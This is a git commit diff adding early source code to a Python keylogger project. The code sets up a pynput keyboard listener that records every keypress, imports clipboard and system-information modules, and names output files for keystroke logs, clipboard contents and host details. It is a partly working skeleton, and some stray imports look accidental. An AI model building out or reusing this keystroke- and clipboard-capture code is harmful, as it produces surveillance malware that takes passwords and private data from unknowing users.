c93a0c23af7071b18382727231771afa97f7e360
RTTGOD <avianrtt71@gmail.com>
2022-08-21 14:42:06 +1200

    Basic keylogging functionality implemented...

--- KeyLogger.py
+++ KeyLogger.py
@@ -1,13 +1,32 @@
 #!/user/bin/python3
-import pywin32_system32
-import pynput
-import scipy
-import cryptography
-import requests
-import PIL #pillow libary
-import sounddevice
+#sub modules
+from distutils.file_util import write_file
+from itertools import count
+from turtle import onrelease
+import win32clipboard #/GetclipboardData
+from pynput.keyboard import Key, Listener
+import socket #getHostname will get host name, and getHostbyname will get internal IP
+import platform #get system info, such as processor etc. external IP: get(‘https://api.ipify.org’).text
+import time
+import os
+#extensions
+system_information = "system.txt"
+keys_information = "keylogs.txt"
+clipboard_info = "clipboard.txt"
 
+file_path = "t:/Personal Projects/Keylogger/"
 
+count=0
+keys = []
 
+def on_press(key):
+    global keys, count
+    print("{0} pressed".format(key))
 
+        
+def on_release(key):
+    if key == Key.esc:
+        return False
 
+with Listener(on_press=on_press, on_release=on_release) as Listener:
+    Listener.join()
